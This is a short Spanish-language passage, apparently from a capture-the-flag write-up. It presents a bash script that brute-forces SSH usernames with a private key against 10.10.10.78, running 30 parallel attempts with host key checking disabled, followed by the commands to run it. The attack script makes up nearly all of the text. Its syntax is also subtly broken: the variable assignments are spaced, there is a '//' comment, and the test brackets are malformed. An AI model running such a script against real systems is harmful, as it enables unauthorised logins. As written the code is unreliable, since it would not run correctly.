``` bash
	
	#!/bin/bash
	
	trap ctrl_c INT
	
	function ctrl_c(){
		pkill ssh
		exit 0
	}
	
	counter = 0
	top = 30 		// número de hilos para no saturar el servidor
	
	cat $1 | while read username; do
		ssh -i id_rsa $username@10.10.10.78 -o StrictHostkeyChecking=no -ct 2>/dev/null &
		let counter += 1
		if ["$(echo $counter)" == "$top"]; then
			wait; sleep 0.5
			let top += 30
		fi
	done
		
```

Se le da permisos de ejecución al fichero:
`chmod +x brute_force_id_rsa.ssh`
Ejecución, donde "users" debe ser un fichero con los usuarios:
`./brute_force_id_rsa.ssh users`